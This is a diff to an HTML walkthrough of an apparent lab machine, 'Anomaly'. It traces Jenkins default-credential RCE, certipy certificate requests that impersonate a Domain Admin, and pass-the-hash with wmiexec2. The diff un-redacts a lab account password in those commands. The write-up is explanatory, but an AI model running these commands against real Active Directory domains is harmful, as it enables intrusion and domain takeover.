@@ -285,7 +285,7 @@
   <h2>Initial Access - Jenkins RCE</h2>
 
   <h3><span class="step">[Step 3]</span> Jenkins Default Credentials</h3>
-  <p>Browsing to port 8080 on the Ubuntu server revealed a Jenkins login page. I tested default credentials and successfully authenticated with <code>admin:admin</code>.</p>
+  <p>Browsing to port 8080 on the Ubuntu server revealed a Jenkins login page. I tested default credentials and successfully authenticated with <code>admin:[REDACTED]</code>.</p>
 
   <div class="question">
     <strong>What is Jenkins?</strong>
@@ -451,7 +451,7 @@ krbtgt             2025-09-21 11:54:56 0       Key Distribution Center Service A
 Brandon_Boyd       2025-11-12 20:30:05 0       [REDACTED]
 anna_molly         2025-11-12 20:29:16 0</code></pre>
 
-  <p>The description field for <code>Brandon_Boyd</code> contained a password: <code>[REDACTED]</code></p>
+  <p>The description field for <code>Brandon_Boyd</code> contained a password: <code>[REDACTED]</code>.</p>
 
   <div class="question">
     <strong>Why check user descriptions?</strong>
@@ -539,7 +539,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <h3><span class="step">[Step 20]</span> Certificate Request for Domain Admin</h3>
   <p>I first attempted to impersonate the Administrator account, but authentication failed (likely disabled or restricted):</p>
 
-  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p '[REDACTED]' \
+  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
     -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
     -ca 'anomaly-ANOMALY-DC-CA-2' -template CertAdmin \
     -upn 'administrator@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-500'</code></pre>
@@ -555,7 +555,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <p><img src="../assets/anomaly/bloodhound-anna-molly.png" alt="BloodHound showing anna_molly as Domain Admin with SID"></p>
 
   <h3><span class="step">[Step 22]</span> Requesting Certificate as anna_molly</h3>
-  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p '[REDACTED]' \
+  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
     -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
     -ca 'anomaly-ANOMALY-DC-CA-2' -template CertAdmin \
     -upn 'anna_molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'
@@ -568,7 +568,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <pre><code>$ certipy auth -pfx anna_molly.pfx -dc-ip 10.1.111.50
 [*] Got TGT
 [*] Saving credential cache to 'anna_molly.ccache'
-[*] Got hash for 'anna_molly@anomaly.hsm': [REDACTED]:[REDACTED]</code></pre>
+[*] Got hash for 'anna_molly@anomaly.hsm': aad3b435b51404eeaad3b435b51404ee:[REDACTED]</code></pre>
 
   <div class="question">
     <strong>What is UnPAC-the-Hash?</strong>
@@ -594,7 +594,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <p><strong>Tool:</strong> <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener">wmiexec2 on GitHub</a></p>
 
   <pre><code>$ python3 wmiexec2.py anomaly.hsm/anna_molly@10.1.111.50 \
-    -hashes [REDACTED]:[REDACTED]
+    -hashes aad3b435b51404eeaad3b435b51404ee:[REDACTED]
 
 [*] SMBv3.0 dialect used
 [*] Launching wmiexec2
@@ -607,7 +607,7 @@ C:\Users\Administrator\Desktop> type root.txt
 
   <h2>Attack Path Summary</h2>
   <div class="attack-diagram">
-    <pre><code>Jenkins (Default Creds: admin:admin)
+    <pre><code>Jenkins (Default Creds: admin:[REDACTED])
          |
          v
 Groovy RCE --> jenkins user shell
